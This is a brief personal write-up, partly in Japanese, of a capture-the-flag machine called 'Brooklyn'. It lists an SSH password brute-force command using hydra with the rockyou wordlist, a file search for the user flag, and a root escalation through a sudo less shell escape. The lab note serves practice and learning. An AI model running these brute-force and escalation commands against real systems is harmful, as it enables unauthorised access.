---
title: "Brooklyn"
date: 2024-03-16T11:36:42+09:00
draft: false
---

### user.txt

- FTP
  - jake がユーザー名？
- ```hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.10.241 ssh```
- ```find / 2>/dev/null | grep user.txt```

### root.txt

- less
  - - sudo less /etc/profile
  - !/bin/sh
